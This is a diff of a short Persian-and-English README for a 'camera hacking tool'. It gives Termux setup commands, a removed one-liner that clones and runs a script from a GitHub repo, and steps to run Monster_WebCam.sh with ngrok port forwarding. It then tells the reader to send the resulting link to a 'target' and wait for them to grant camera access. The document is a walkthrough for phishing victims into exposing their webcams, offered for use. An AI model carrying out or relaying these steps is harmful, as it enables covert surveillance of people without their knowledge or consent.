@@ -2,22 +2,20 @@
 ابزار هک دوربین با ارسال لینک به قربانی - Camera hacking tool by sending link to target
 
 
-1- https://github.com/HACKGM/cam/blob/master/on-hotspot.png نقطه اتصال گوشی رو روشن کنید
+1- نقطه اتصال گوشی رو روشن کنید
 
 2- Download termux ترموکس رو دانلود کنید
 
 کد های زیر رو بزنید تا ابزار اجرا بشه
 
-3-
+3-pkg install wget php openssh openssl
 
-apt update && apt upgrade && pkg install wget php git openssl curl && git clone https://github.com/HACKGM/cam && cd cam && bash cam.sh
+4- cd Monster_WebCam
 
+5-bash Monster_WebCam.sh
 
 سپس گزینه 2 یعنی همون
  ngrok
 رو بزنید برای پورت فراوردینگ
 
-canal telegram: http://t.me/hackgm
-
-wathc video:
-https://youtu.be/o5LLXdjP--4
+بعد بهتون یه لینک میده اون لینک رو به تارگت بدید و صبر کنید تا دسترسی دوربین رو بزنه 
